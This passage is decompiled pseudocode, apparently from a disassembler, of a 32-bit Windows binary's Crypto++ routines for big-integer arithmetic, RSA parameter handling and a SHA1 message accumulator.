      LOBYTE(v43) = 10;
      v17 = sub_43E500(v16, 1u);
      v18 = v11 & 0xFFFFFFC1 | 0x2A;
      v50 = sub_43D420(&v34, v17);
      v67 = v14 & 0xFFFFFFC5 | 0x2A;
      v19 = v53;
      v20 = Block;
      if ( v52 < v53 )
        v19 = v52;
      LOBYTE(v43) = 11;
      memset(Block, 0, 4 * v19);
      if ( v19 )
        j_j_unknown_libname_61(v20);
      else
        j_j___free_base(v20);
      LOBYTE(v43) = 9;
      sub_43DBB0(v38, v50);
      v3 = v18 & 0xFFFFFFDF;
      v67 = v3;
      v21 = v36;
      v22 = v37;
      if ( v35 < v36 )
        v21 = v35;
      LOBYTE(v43) = 12;
      memset(v37, 0, 4 * v21);
      if ( v21 )
        j_j_unknown_libname_61(v22);
      else
        j_j___free_base(v22);
      v23 = v46;
      v24 = v47;
      if ( v45 < v46 )
        v23 = v45;
      LOBYTE(v43) = 13;
      memset(v47, 0, 4 * v23);
      if ( v23 )
        j_j_unknown_libname_61(v24);
      else
        j_j___free_base(v24);
      v25 = v49;
      v26 = v59;
      if ( v57 < v49 )
        v25 = v57;
      LOBYTE(v43) = 14;
      memset(v59, 0, 4 * v25);
      if ( v25 )
        j_j_unknown_libname_61(v26);
      else
        j_j___free_base(v26);
      LOBYTE(v43) = 2;
      if ( v42 != 1 )
        break;
      v2 = v66;
      if ( v65 == 1 )
      {
        v27 = -sub_443E50(v38, (int)v61);
        goto LABEL_53;
      }
    }
    if ( v65 == 1 )
      break;
    v27 = sub_443E50(v38, (int)v61);
LABEL_53:
    v2 = v66;
  }
  while ( v27 < 0 );
  sub_43D420(a2, v61);
  v67 = v3 | 1;
  v28 = v40;
  v29 = v41;
  if ( v39 < v40 )
    v28 = v39;
  LOBYTE(v43) = 15;
  memset(v41, 0, 4 * v28);
  if ( v28 )
    j_j_unknown_libname_61(v29);
  else
    j_j___free_base(v29);
  v30 = v63;
  v31 = v64;
  if ( v62 < v63 )
    v30 = v62;
  v43 = 16;
  memset(v64, 0, 4 * v30);
  if ( v30 )
    j_j_unknown_libname_61(v31);
  else
    j_j___free_base(v31);
  return a2;
}
// 44DF24: conditional instruction was optimized away because eax.4!=0
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;
// 4EEE04: using guessed type int dword_4EEE04;
// 44DEA0: using guessed type _DWORD var_20[2];
// 44DEA0: using guessed type _DWORD var_94[2];
// 44DEA0: using guessed type _DWORD var_70[2];

//----- (0044E2A0) --------------------------------------------------------
_DWORD *__thiscall sub_44E2A0(_DWORD *this, int a2, int a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // ebx
  unsigned int v6; // edx
  void *v7; // esi
  int v9; // [esp+10h] [ebp-24h] BYREF
  unsigned int v10; // [esp+18h] [ebp-1Ch]
  unsigned int v11; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v13; // [esp+30h] [ebp-4h]

  v4 = sub_43DF90(&v9, a2, a3);
  v13 = 0;
  v5 = sub_43DBB0(this + 9, v4);
  v6 = v11;
  v7 = Block;
  if ( v10 < v11 )
    v6 = v10;
  v13 = 1;
  memset(Block, 0, 4 * v6);
  if ( v6 )
    j_j_unknown_libname_61(v7);
  else
    j_j___free_base(v7);
  return v5;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0044E340) --------------------------------------------------------
_DWORD *__thiscall sub_44E340(_DWORD *this, int a2, int a3)
{
  int v4; // eax
  _DWORD *v6; // eax
  unsigned int v7; // edx
  void *v8; // ebx
  int v9; // ecx
  _DWORD *v10; // esi
  int v11; // [esp+10h] [ebp-24h] BYREF
  unsigned int v12; // [esp+18h] [ebp-1Ch]
  unsigned int v13; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v15; // [esp+30h] [ebp-4h]
  int v16; // [esp+3Ch] [ebp+8h]

  v4 = this[6];
  if ( *(_DWORD *)(a2 + 12) == v4 && *(_DWORD *)(a3 + 12) == v4 )
  {
    if ( off_4E8030(*(_DWORD *)(a2 + 16), *(_DWORD *)(a3 + 16)) )
      off_4E802C(this[13], this[7]);
    return this + 9;
  }
  else
  {
    v6 = sub_43DF90(&v11, a2, a3);
    v15 = 0;
    v16 = (int)(this + 15);
    sub_43DBB0(this + 15, v6);
    v7 = v13;
    v8 = Block;
    if ( v12 < v13 )
      v7 = v12;
    v15 = 1;
    memset(Block, 0, 4 * v7);
    if ( v7 )
      j_j_unknown_libname_61(v8);
    else
      j_j___free_base(v8);
    v15 = -1;
    if ( this[20] != 1 )
      return this + 15;
    v9 = (int)(this + 3);
    v10 = this + 15;
    sub_43E3C0(v16, v9);
    return v10;
  }
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);

//----- (0044E440) --------------------------------------------------------
_DWORD *__thiscall sub_44E440(_DWORD *this, _DWORD *a2, int a3)
{
  sub_43D6C0(a2);
  sub_444070((int)a2, (int)this, a3);
  if ( (this[5] != 1) != (*(_DWORD *)(a3 + 20) != 1) )
    sub_443BC0(a2);
  return a2;
}

//----- (0044E4D0) --------------------------------------------------------
int *sub_44E4D0()
{
  return &dword_4EEE34;
}
// 4EEE34: using guessed type int dword_4EEE34;

//----- (0044E4E0) --------------------------------------------------------
unsigned int __cdecl sub_44E4E0(unsigned int *a1, unsigned int a2)
{
  unsigned int result; // eax
  unsigned int *v3; // ecx
  __m128i v4; // xmm0

  sub_441320(a1, a2, 1);
  result = 0;
  if ( a2 )
  {
    if ( a2 >= 0x10 )
    {
      v3 = a1 + 8;
      do
      {
        v4 = *((__m128i *)v3 - 2);
        result += 16;
        v3 += 16;
        *((__m128i *)v3 - 6) = _mm_andnot_si128(v4, (__m128i)xmmword_4BAFC0);
        *((__m128i *)v3 - 5) = _mm_andnot_si128(*((__m128i *)v3 - 5), (__m128i)xmmword_4BAFC0);
        *((__m128i *)v3 - 4) = _mm_andnot_si128(*((__m128i *)v3 - 4), (__m128i)xmmword_4BAFC0);
        *((__m128i *)v3 - 3) = _mm_andnot_si128(*((__m128i *)v3 - 3), (__m128i)xmmword_4BAFC0);
      }
      while ( result < (a2 & 0xFFFFFFF0) );
    }
    for ( ; result < a2; ++result )
      a1[result] = ~a1[result];
  }
  return result;
}
// 4BAFC0: using guessed type __int128 xmmword_4BAFC0;

//----- (0044E560) --------------------------------------------------------
int __thiscall sub_44E560(_DWORD *this)
{
  int result; // eax
  _DWORD *v2; // ecx

  result = this[3];
  if ( result )
  {
    v2 = (_DWORD *)(this[4] + 4 * (result - 1));
    do
    {
      if ( *v2 )
        break;
      --v2;
      --result;
    }
    while ( result );
  }
  return result;
}

//----- (0044E580) --------------------------------------------------------
_DWORD *__cdecl sub_44E580(_DWORD *a1, int a2, int a3, _DWORD *a4)
{
  bool v4; // zf
  _DWORD *v5; // ecx
  int v6; // eax
  _DWORD *v7; // ecx
  unsigned int v9; // [esp-4h] [ebp-A4h]
  int v10[3]; // [esp+10h] [ebp-90h] BYREF
  int v11[6]; // [esp+1Ch] [ebp-84h] BYREF
  int v12[6]; // [esp+34h] [ebp-6Ch] BYREF
  int v13[6]; // [esp+4Ch] [ebp-54h] BYREF
  int v14; // [esp+64h] [ebp-3Ch]
  char pExceptionObject[40]; // [esp+68h] [ebp-38h] BYREF
  int v16; // [esp+9Ch] [ebp-4h]

  v4 = a4[5] == 1;
  v14 = a3;
  if ( !v4 )
  {
    v5 = (_DWORD *)a4[4];
    if ( !*v5 )
    {
      v6 = a4[3];
      if ( !v6 )
      {
LABEL_9:
        sub_43D290(pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVDivideByZero_Integer_CryptoPP__);
      }
      v7 = &v5[v6 - 1];
      while ( !*v7 )
      {
        --v7;
        if ( !--v6 )
          goto LABEL_9;
      }
    }
  }
  v10[1] = (int)&CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  v10[2] = (int)v10;
  v10[0] = (int)&CryptoPP::ModularArithmetic::`vftable';
  sub_43D420(v11, a4);
  v9 = a4[3];
  v16 = 0;
  sub_43D360(v12, 0, v9);
  LOBYTE(v16) = 1;
  sub_43D6C0(v13);
  v16 = 2;
  sub_43B200(v10, a1, a2, v14);
  sub_439F00(v10);
  return a1;
}
// 44E5F4: conditional instruction was optimized away because eax.4!=0
// 4BA46C: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 4BA4A4: using guessed type void *CryptoPP::ModularArithmetic::`vftable';
// 44E580: using guessed type int var_84[6];
// 44E580: using guessed type int var_6C[6];
// 44E580: using guessed type int var_54[6];

//----- (0044E6A0) --------------------------------------------------------
int __thiscall sub_44E6A0(int this, int a2, __int64 a3)
{
  char v4; // di
  int v5; // eax
  int v6; // ecx
  unsigned int v7; // ebx
  int v8; // eax
  __int64 v9; // rax
  int v10; // edx
  int v11; // eax
  _DWORD *v12; // edx
  char v13; // al
  char v14; // cl
  int v15; // eax
  int v16; // ecx
  int v17; // eax
  int v18; // eax
  int v19; // ecx
  char *v21; // esi
  int *v22; // eax
  int v23; // [esp+0h] [ebp-44h] BYREF
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-34h] BYREF
  char v25; // [esp+28h] [ebp-1Ch]
  int v26; // [esp+2Ch] [ebp-18h]
  int v27; // [esp+30h] [ebp-14h]
  int *v28; // [esp+34h] [ebp-10h]
  int v29; // [esp+40h] [ebp-4h]

  v28 = &v23;
  v27 = this;
  v4 = 0;
  pExceptionObject[5] = this;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 0;
  v5 = *(_DWORD *)this;
  v26 = 0;
  v6 = *(_DWORD *)(*(_DWORD *)(v5 + 4) + this + 56);
  if ( v6 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v6 + 4))(v6);
  v29 = 0;
  v25 = sub_427AC0((_BYTE *)this, 1);
  v29 = 1;
  if ( v25 )
  {
    if ( a3 >= 0 )
    {
      v7 = a3;
      if ( a3 > 0 )
      {
        v8 = *(_DWORD *)(*(_DWORD *)this + 4);
        LOBYTE(v29) = 2;
        v9 = ((__int64 (__thiscall *)(_DWORD, int, _DWORD, _DWORD))*(_DWORD *)(**(_DWORD **)(v8 + this + 56) + 32))(
               *(_DWORD *)(v8 + this + 56),
               a2,
               a3,
               HIDWORD(a3));
        *(_QWORD *)(this + 8) += v9;
        if ( v9 != __PAIR64__(HIDWORD(a3), v7) )
          v4 = 3;
        v29 = 1;
      }
    }
  }
  v10 = *(_DWORD *)(*(_DWORD *)this + 4);
  v11 = *(_DWORD *)(v10 + this + 12);
  v12 = (_DWORD *)(this + v10);
  v13 = v4 | v11;
  v14 = v13 | 4;
  if ( v12[14] )
    v14 = v13;
  v15 = v12[4];
  v16 = v14 & 0x17;
  v12[3] = v16;
  v17 = v16 & v15;
  if ( v17 )
  {
    if ( (v17 & 4) != 0 )
    {
      v21 = "ios_base::badbit set";
    }
    else
    {
      v21 = "ios_base::failbit set";
      if ( (v17 & 2) == 0 )
        v21 = "ios_base::eofbit set";
    }
    v22 = sub_402C50(&a3, 1);
    sub_403590(pExceptionObject, v21, v22);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
  }
  v18 = *(_DWORD *)this;
  v29 = 4;
  v19 = *(_DWORD *)(*(_DWORD *)(v18 + 4) + this + 56);
  if ( v19 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v19 + 8))(v19);
  return this;
}

//----- (0044E830) --------------------------------------------------------
int __thiscall sub_44E830(_DWORD *this, _DWORD *a2)
{
  int v3; // edx
  int v4; // eax
  int v5; // ecx
  int v6; // eax
  int v7; // ecx
  int result; // eax
  int v9; // ecx

  v3 = this[2];
  this[2] = a2[2];
  v4 = a2[3];
  a2[2] = v3;
  v5 = this[3];
  this[3] = v4;
  v6 = a2[4];
  a2[3] = v5;
  v7 = this[4];
  this[4] = v6;
  result = a2[5];
  a2[4] = v7;
  v9 = this[5];
  this[5] = result;
  a2[5] = v9;
  return result;
}

//----- (0044E870) --------------------------------------------------------
_DWORD *__thiscall sub_44E870(_DWORD *this, const char *a2, void (__thiscall *a3)(int, _DWORD *), int a4, int a5)
{
  int *v6; // ecx
  int v7; // eax
  void *v9; // eax
  char *v10; // eax
  char *v11; // eax
  char *v12; // eax
  _DWORD *v13; // eax
  _DWORD v14[6]; // [esp+Ch] [ebp-B0h] BYREF
  char v15[24]; // [esp+24h] [ebp-98h] BYREF
  char v16[24]; // [esp+3Ch] [ebp-80h] BYREF
  char v17[24]; // [esp+54h] [ebp-68h] BYREF
  char v18[24]; // [esp+6Ch] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+84h] [ebp-38h] BYREF
  int v20; // [esp+B8h] [ebp-4h]

  if ( !*((_BYTE *)this + 8) )
  {
    sub_43D6C0(v14);
    v6 = (int *)this[1];
    v7 = *v6;
    v20 = 0;
    if ( !(*(unsigned __int8 (__thiscall **)(int *, const char *, void *, _DWORD *))(v7 + 4))(
            v6,
            a2,
            &CryptoPP::Integer `RTTI Type Descriptor',
            v14) )
    {
      v9 = (void *)sub_401A40((char *)&CryptoPP::InvertibleRSAFunction `RTTI Type Descriptor');
      v10 = (char *)sub_419B80((int)v18, v9);
      LOBYTE(v20) = 1;
      v11 = (char *)sub_421F20((int)v17, v10, ": Missing required parameter '");
      LOBYTE(v20) = 2;
      v12 = (char *)sub_421F20((int)v16, v11, a2);
      LOBYTE(v20) = 3;
      v13 = (_DWORD *)sub_421F20((int)v15, v12, "'");
      LOBYTE(v20) = 4;
      sub_405230(pExceptionObject, v13);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    a3(*this + *(_DWORD *)(*(_DWORD *)(*this + 8) + a5) + a4 + 8, v14);
    sub_4066A0((int)v14);
  }
  return this;
}
// 44E870: using guessed type _DWORD var_B0[6];
// 44E870: using guessed type char var_50[24];
// 44E870: using guessed type char var_68[24];
// 44E870: using guessed type char var_80[24];
// 44E870: using guessed type char var_98[24];

//----- (0044E990) --------------------------------------------------------
_DWORD *__thiscall sub_44E990(_DWORD *this, const char *a2, void (__thiscall *a3)(int, _DWORD *), int a4, int a5)
{
  int *v6; // ecx
  int v7; // eax
  void *v9; // eax
  char *v10; // eax
  char *v11; // eax
  char *v12; // eax
  _DWORD *v13; // eax
  _DWORD v14[6]; // [esp+Ch] [ebp-B0h] BYREF
  char v15[24]; // [esp+24h] [ebp-98h] BYREF
  char v16[24]; // [esp+3Ch] [ebp-80h] BYREF
  char v17[24]; // [esp+54h] [ebp-68h] BYREF
  char v18[24]; // [esp+6Ch] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+84h] [ebp-38h] BYREF
  int v20; // [esp+B8h] [ebp-4h]

  if ( !*((_BYTE *)this + 8) )
  {
    sub_43D6C0(v14);
    v6 = (int *)this[1];
    v7 = *v6;
    v20 = 0;
    if ( !(*(unsigned __int8 (__thiscall **)(int *, const char *, void *, _DWORD *))(v7 + 4))(
            v6,
            a2,
            &CryptoPP::Integer `RTTI Type Descriptor',
            v14) )
    {
      v9 = (void *)sub_401A40((char *)&CryptoPP::RSAFunction `RTTI Type Descriptor');
      v10 = (char *)sub_419B80((int)v18, v9);
      LOBYTE(v20) = 1;
      v11 = (char *)sub_421F20((int)v17, v10, ": Missing required parameter '");
      LOBYTE(v20) = 2;
      v12 = (char *)sub_421F20((int)v16, v11, a2);
      LOBYTE(v20) = 3;
      v13 = (_DWORD *)sub_421F20((int)v15, v12, "'");
      LOBYTE(v20) = 4;
      sub_405230(pExceptionObject, v13);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    a3(*this + *(_DWORD *)(*(_DWORD *)(*this + 8) + a5) + a4 + 8, v14);
    sub_4066A0((int)v14);
  }
  return this;
}
// 44E990: using guessed type _DWORD var_B0[6];
// 44E990: using guessed type char var_50[24];
// 44E990: using guessed type char var_68[24];
// 44E990: using guessed type char var_80[24];
// 44E990: using guessed type char var_98[24];

//----- (0044EAB0) --------------------------------------------------------
void *__thiscall sub_44EAB0(void *this, void *a2, int (__thiscall *a3)(int), int a4, int a5)
{
  char *v6; // eax
  int v7; // eax
  _DWORD *v8; // eax

  if ( *((_BYTE *)this + 17) )
  {
    v6 = (char *)sub_41F120(*((char **)this + 3), a2, strlen((const char *)a2));
    sub_41F120(v6, ";", 1u);
  }
  if ( !*((_BYTE *)this + 16) )
  {
    v7 = strcmp((const char *)a2, *((const char **)this + 1));
    if ( v7 )
      v7 = v7 < 0 ? -1 : 1;
    if ( !v7 )
    {
      sub_4059C0(a2, (int)&CryptoPP::Integer `RTTI Type Descriptor', *((_DWORD *)this + 2));
      v8 = (_DWORD *)a3(a4 + 8 + *(_DWORD *)this + *(_DWORD *)(*(_DWORD *)(*(_DWORD *)this + 8) + a5));
      sub_43DBB0(*((_DWORD **)this + 3), v8);
      *((_BYTE *)this + 16) = 1;
    }
  }
  return this;
}

//----- (0044EB60) --------------------------------------------------------
_DWORD *__thiscall sub_44EB60(_DWORD *this, int a2, int a3)
{
  void *v4; // edx
  void **v5; // eax
  __int128 *v6; // ecx
  int (__thiscall *v7)(int, __int128 *, void *, int); // eax
  void *v8; // ecx
  void *v9; // ecx
  char *v11; // [esp+Ch] [ebp-50h]
  char v12; // [esp+1Bh] [ebp-41h]
  int v13[5]; // [esp+1Ch] [ebp-40h] BYREF
  unsigned int v14; // [esp+30h] [ebp-2Ch]
  __int128 v15; // [esp+34h] [ebp-28h] BYREF
  __int64 v16; // [esp+44h] [ebp-18h]
  int v17; // [esp+58h] [ebp-4h]

  *this = a2;
  this[1] = a3;
  *((_BYTE *)this + 8) = 0;
  v11 = (char *)sub_419B80((int)v13, (void *)"ThisObject:");
  v17 = 0;
  v4 = (void *)__std_type_info_name(&dword_4EE7C4, &stru_4F0838);
  v5 = sub_41F120(v11, v4, strlen((const char *)v4));
  v16 = 0i64;
  v15 = *(_OWORD *)v5;
  v16 = *((_QWORD *)v5 + 2);
  v5[4] = 0;
  v5[5] = (void *)15;
  *(_BYTE *)v5 = 0;
  v6 = &v15;
  if ( HIDWORD(v16) >= 0x10 )
    v6 = (__int128 *)v15;
  v7 = *(int (__thiscall **)(int, __int128 *, void *, int))(*(_DWORD *)a3 + 4);
  LOBYTE(v17) = 1;
  v12 = v7(a3, v6, &CryptoPP::InvertibleRSAFunction `RTTI Type Descriptor', a2);
  LOBYTE(v17) = 0;
  if ( HIDWORD(v16) >= 0x10 )
  {
    v8 = (void *)v15;
    if ( (unsigned int)(HIDWORD(v16) + 1) >= 0x1000 )
    {
      v8 = *(void **)(v15 - 4);
      if ( (unsigned int)(v15 - (_DWORD)v8 - 4) > 0x1F )
        goto LABEL_16;
    }
    sub_46C87D(v8);
  }
  v16 = 0xF00000000i64;
  LOBYTE(v15) = 0;
  v17 = -1;
  if ( v14 < 0x10 )
    goto LABEL_11;
  v9 = (void *)v13[0];
  if ( v14 + 1 >= 0x1000 )
  {
    v9 = *(void **)(v13[0] - 4);
    if ( (unsigned int)(v13[0] - (_DWORD)v9 - 4) > 0x1F )
LABEL_16:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_46C87D(v9);
LABEL_11:
  v13[4] = 0;
  v14 = 15;
  LOBYTE(v13[0]) = 0;
  if ( v12 )
  {
    *((_BYTE *)this + 8) = 1;
  }
  else if ( __std_type_info_compare(&dword_4ECFEC, &dword_4EE7C4) )
  {
    sub_44F700((void *)(a2 + 60), a3);
  }
  return this;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 48388B: using guessed type _DWORD __cdecl __std_type_info_name(_DWORD, PSLIST_HEADER ListHead);
// 4ECFEC: using guessed type int dword_4ECFEC;
// 4EE7C4: using guessed type int dword_4EE7C4;

//----- (0044ED20) --------------------------------------------------------
_DWORD *__thiscall sub_44ED20(_DWORD *this, int a2, int a3)
{
  void *v4; // edx
  void **v5; // eax
  __int128 *v6; // ecx
  int (__thiscall *v7)(int, __int128 *, void *, int); // eax
  void *v8; // ecx
  void *v9; // ecx
  char *v11; // [esp+Ch] [ebp-50h]
  char v12; // [esp+1Bh] [ebp-41h]
  int v13[5]; // [esp+1Ch] [ebp-40h] BYREF
  unsigned int v14; // [esp+30h] [ebp-2Ch]
  __int128 v15; // [esp+34h] [ebp-28h] BYREF
  __int64 v16; // [esp+44h] [ebp-18h]
  int v17; // [esp+58h] [ebp-4h]

  *this = a2;
  this[1] = a3;
  *((_BYTE *)this + 8) = 0;
  v11 = (char *)sub_419B80((int)v13, (void *)"ThisObject:");
  v17 = 0;
  v4 = (void *)__std_type_info_name(&dword_4ECFEC, &stru_4F0838);
  v5 = sub_41F120(v11, v4, strlen((const char *)v4));
  v16 = 0i64;
  v15 = *(_OWORD *)v5;
  v16 = *((_QWORD *)v5 + 2);
  v5[4] = 0;
  v5[5] = (void *)15;
  *(_BYTE *)v5 = 0;
  v6 = &v15;
  if ( HIDWORD(v16) >= 0x10 )
    v6 = (__int128 *)v15;
  v7 = *(int (__thiscall **)(int, __int128 *, void *, int))(*(_DWORD *)a3 + 4);
  LOBYTE(v17) = 1;
  v12 = v7(a3, v6, &CryptoPP::RSAFunction `RTTI Type Descriptor', a2);
  LOBYTE(v17) = 0;
  if ( HIDWORD(v16) >= 0x10 )
  {
    v8 = (void *)v15;
    if ( (unsigned int)(HIDWORD(v16) + 1) >= 0x1000 )
    {
      v8 = *(void **)(v15 - 4);
      if ( (unsigned int)(v15 - (_DWORD)v8 - 4) > 0x1F )
        goto LABEL_16;
    }
    sub_46C87D(v8);
  }
  v16 = 0xF00000000i64;
  LOBYTE(v15) = 0;
  v17 = -1;
  if ( v14 < 0x10 )
    goto LABEL_11;
  v9 = (void *)v13[0];
  if ( v14 + 1 >= 0x1000 )
  {
    v9 = *(void **)(v13[0] - 4);
    if ( (unsigned int)(v13[0] - (_DWORD)v9 - 4) > 0x1F )
LABEL_16:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_46C87D(v9);
LABEL_11:
  v13[4] = 0;
  v14 = 15;
  LOBYTE(v13[0]) = 0;
  if ( v12 )
  {
    *((_BYTE *)this + 8) = 1;
  }
  else if ( __std_type_info_compare(&dword_4ECFEC, &dword_4ECFEC) )
  {
    sub_44F700(a3);
  }
  return this;
}
// 44F700: using guessed type _DWORD __stdcall sub_44F700(_DWORD);
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 48388B: using guessed type _DWORD __cdecl __std_type_info_name(_DWORD, PSLIST_HEADER ListHead);
// 4ECFEC: using guessed type int dword_4ECFEC;

//----- (0044EEE0) --------------------------------------------------------
void *__thiscall sub_44EEE0(void *this, int a2, char *a3, int a4, _DWORD *a5, int a6)
{
  _DWORD *v6; // ebp
  int v8; // eax
  void *v9; // ebx
  char *v10; // eax
  void **v11; // eax
  const char *v12; // eax
  char *v13; // ebx
  int v14; // eax
  void *result; // eax
  char v16; // al

  v6 = a5;
  *(_DWORD *)this = a2;
  *((_DWORD *)this + 2) = a4;
  *((_DWORD *)this + 1) = a3;
  *((_DWORD *)this + 3) = a5;
  *((_WORD *)this + 8) = 0;
  v8 = strcmp(a3, "ValueNames");
  if ( v8 )
    v8 = v8 < 0 ? -1 : 1;
  if ( !v8 )
  {
    *((_WORD *)this + 8) = 257;
    sub_4059C0(a3, (int)&std::string `RTTI Type Descriptor', a4);
    if ( a6 )
      (*(void (__thiscall **)(int, _DWORD, int, _DWORD *))(*(_DWORD *)a6 + 4))(a6, *((_DWORD *)this + 1), a4, a5);
    if ( __std_type_info_compare(&dword_4EE7C4, &dword_4ECFEC) )
      sub_450E20((void *)(a2 + 60), *((char **)this + 1), a4, a5);
    v9 = (void *)__std_type_info_name(&dword_4EE7C4, &stru_4F0838);
    v10 = (char *)sub_41F120(*((char **)this + 3), (void *)"ThisPointer:", 0xCu);
    v11 = sub_41F120(v10, v9, strlen((const char *)v9));
    sub_419990((int)v11, 59);
    if ( *((_BYTE *)this + 16) )
      goto LABEL_15;
    v6 = a5;
  }
  if ( !strncmp(*((const char **)this + 1), "ThisPointer:", 0xCu) )
  {
    v12 = (const char *)__std_type_info_name(&dword_4EE7C4, &stru_4F0838);
    v13 = (char *)*((_DWORD *)this + 1);
    v14 = strcmp(v13 + 12, v12);
    if ( v14 )
      v14 = v14 < 0 ? -1 : 1;
    if ( !v14 )
    {
      sub_4059C0(v13, (int)&CryptoPP::InvertibleRSAFunction * `RTTI Type Descriptor', *((_DWORD *)this + 2));
      *v6 = a2;
      result = this;
      *((_BYTE *)this + 16) = 1;
      return result;
    }
  }
LABEL_15:
  if ( !*((_BYTE *)this + 16) )
  {
    if ( !a6
      || (v16 = (*(int (__thiscall **)(int, _DWORD, int, _DWORD *))(*(_DWORD *)a6 + 4))(
                  a6,
                  *((_DWORD *)this + 1),
                  a4,
                  a5),
          (*((_BYTE *)this + 16) = v16) == 0) )
    {
      if ( __std_type_info_compare(&dword_4EE7C4, &dword_4ECFEC) )
        *((_BYTE *)this + 16) = sub_450E20((void *)(a2 + 60), *((char **)this + 1), a4, a5);
    }
  }
  return this;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 48388B: using guessed type _DWORD __cdecl __std_type_info_name(_DWORD, PSLIST_HEADER ListHead);
// 4E9240: using guessed type void **std::string `RTTI Type Descriptor';
// 4E9A98: using guessed type struct CryptoPP::InvertibleRSAFunction *CryptoPP::InvertibleRSAFunction * `RTTI Type Descriptor';
// 4ECFEC: using guessed type int dword_4ECFEC;
// 4EE7C4: using guessed type int dword_4EE7C4;

//----- (0044F0D0) --------------------------------------------------------
void *__thiscall sub_44F0D0(void *this, int a2, char *a3, int a4, _DWORD *a5, int a6)
{
  _DWORD *v6; // ebp
  int v8; // eax
  void *v9; // ebx
  char *v10; // eax
  void **v11; // eax
  const char *v12; // eax
  char *v13; // ebx
  int v14; // eax
  void *result; // eax
  char v16; // al

  v6 = a5;
  *(_DWORD *)this = a2;
  *((_DWORD *)this + 2) = a4;
  *((_DWORD *)this + 1) = a3;
  *((_DWORD *)this + 3) = a5;
  *((_WORD *)this + 8) = 0;
  v8 = strcmp(a3, "ValueNames");
  if ( v8 )
    v8 = v8 < 0 ? -1 : 1;
  if ( !v8 )
  {
    *((_WORD *)this + 8) = 257;
    sub_4059C0(a3, (int)&std::string `RTTI Type Descriptor', a4);
    if ( a6 )
      (*(void (__thiscall **)(int, _DWORD, int, _DWORD *))(*(_DWORD *)a6 + 4))(a6, *((_DWORD *)this + 1), a4, a5);
    if ( __std_type_info_compare(&dword_4ECFEC, &dword_4ECFEC) )
      sub_450E20(*((_DWORD *)this + 1), a4, a5);
    v9 = (void *)__std_type_info_name(&dword_4ECFEC, &stru_4F0838);
    v10 = (char *)sub_41F120(*((char **)this + 3), (void *)"ThisPointer:", 0xCu);
    v11 = sub_41F120(v10, v9, strlen((const char *)v9));
    sub_419990((int)v11, 59);
    if ( *((_BYTE *)this + 16) )
      goto LABEL_15;
    v6 = a5;
  }
  if ( !strncmp(*((const char **)this + 1), "ThisPointer:", 0xCu) )
  {
    v12 = (const char *)__std_type_info_name(&dword_4ECFEC, &stru_4F0838);
    v13 = (char *)*((_DWORD *)this + 1);
    v14 = strcmp(v13 + 12, v12);
    if ( v14 )
      v14 = v14 < 0 ? -1 : 1;
    if ( !v14 )
    {
      sub_4059C0(v13, (int)&CryptoPP::RSAFunction * `RTTI Type Descriptor', *((_DWORD *)this + 2));
      *v6 = a2;
      result = this;
      *((_BYTE *)this + 16) = 1;
      return result;
    }
  }
LABEL_15:
  if ( !*((_BYTE *)this + 16) )
  {
    if ( !a6
      || (v16 = (*(int (__thiscall **)(int, _DWORD, int, _DWORD *))(*(_DWORD *)a6 + 4))(
                  a6,
                  *((_DWORD *)this + 1),
                  a4,
                  a5),
          (*((_BYTE *)this + 16) = v16) == 0) )
    {
      if ( __std_type_info_compare(&dword_4ECFEC, &dword_4ECFEC) )
        *((_BYTE *)this + 16) = sub_450E20(*((_DWORD *)this + 1), a4, a5);
    }
  }
  return this;
}
// 450E20: using guessed type _DWORD __stdcall sub_450E20(_DWORD, _DWORD, _DWORD);
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 48388B: using guessed type _DWORD __cdecl __std_type_info_name(_DWORD, PSLIST_HEADER ListHead);
// 4E9240: using guessed type void **std::string `RTTI Type Descriptor';
// 4E9AC8: using guessed type struct CryptoPP::RSAFunction *CryptoPP::RSAFunction * `RTTI Type Descriptor';
// 4ECFEC: using guessed type int dword_4ECFEC;

//----- (0044F2C0) --------------------------------------------------------
_DWORD *__thiscall sub_44F2C0(_DWORD *this)
{
  sub_435E90(this, 1);
  this[2] = -1;
  this[3] = 0;
  this[4] = 0;
  this[6] = -1;
  this[7] = 0;
  this[8] = 0;
  this[10] = -1;
  this[11] = 0;
  this[12] = 0;
  this[14] = -1;
  this[15] = 0;
  this[16] = 0;
  sub_43D6C0(this + 17);
  sub_43D6C0(this + 23);
  *((_BYTE *)this + 116) = 1;
  sub_41C640(this + 30);
  *this = &CryptoPP::PK_MessageAccumulatorImpl<CryptoPP::SHA1>::`vftable';
  return this;
}
